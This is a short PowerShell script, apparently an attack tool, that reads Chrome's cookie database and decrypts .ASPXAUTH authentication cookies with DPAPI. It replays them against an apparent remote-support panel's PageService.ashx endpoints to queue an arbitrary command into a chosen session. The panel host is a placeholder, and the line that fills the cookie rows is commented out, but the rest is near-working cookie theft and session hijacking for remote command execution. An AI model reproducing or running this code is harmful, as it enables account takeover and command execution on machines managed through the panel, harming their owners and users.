param([string]$Panel = "https://panel.example.invalid", [string]$Command, [string]$SessionId)
$database = "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Network\Cookies"
# $rows = & .\sqlite3.exe -csv $database "SELECT name,hex(encrypted_value) FROM cookies WHERE name='.ASPXAUTH'"
foreach ($row in $rows) {
    $fields = $row -split '","'
    if ($fields.Count -lt 2) { continue }
    $bytes = [byte[]]::new($fields[1].Length / 2)
    for ($i=0; $i -lt $bytes.Length; $i++) {
        $bytes[$i] = [Convert]::ToByte($fields[1].Substring($i*2,2),16)
    }
    $clear = [Security.Cryptography.ProtectedData]::Unprotect($bytes,$null,[Security.Cryptography.DataProtectionScope]::CurrentUser)
    $ticket = [Text.Encoding]::UTF8.GetString($clear)
    $headers = @{ Cookie = ".ASPXAUTH=$ticket" }
    $live = Invoke-RestMethod -Uri "$Panel/Services/PageService.ashx/GetLiveData" -Method Post -Headers $headers -Body '[[],{}]'
    $body = ConvertTo-Json -Depth 8 -InputObject @(@($SessionId),@(@{EventType='QueuedCommand';Data=$Command}))
    Invoke-RestMethod -Uri "$Panel/Services/PageService.ashx/AddSessionEvents" -Method Post -Headers $headers -Body $body
}
